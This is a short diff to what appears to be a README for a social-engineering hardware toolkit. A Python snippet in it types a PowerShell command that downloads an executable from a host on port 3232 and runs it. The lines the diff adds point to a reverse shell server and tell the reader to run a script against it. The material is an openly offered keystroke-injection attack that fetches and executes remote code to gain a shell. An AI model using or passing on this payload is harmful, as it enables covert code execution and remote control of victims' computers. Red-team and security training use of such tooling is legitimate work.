@@ -68,3 +68,7 @@ time.sleep(1)  # Wait for Notepad to open
 layout.write("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
 keyboard.release_all()
 ```
+
+- Setup the [Reverse Shell Server](https://github.com/tbsauce/social-engineering-hardware-toolkit/blob/main/server/reverseshell.md)
+
+- create a link on the server and run the following script
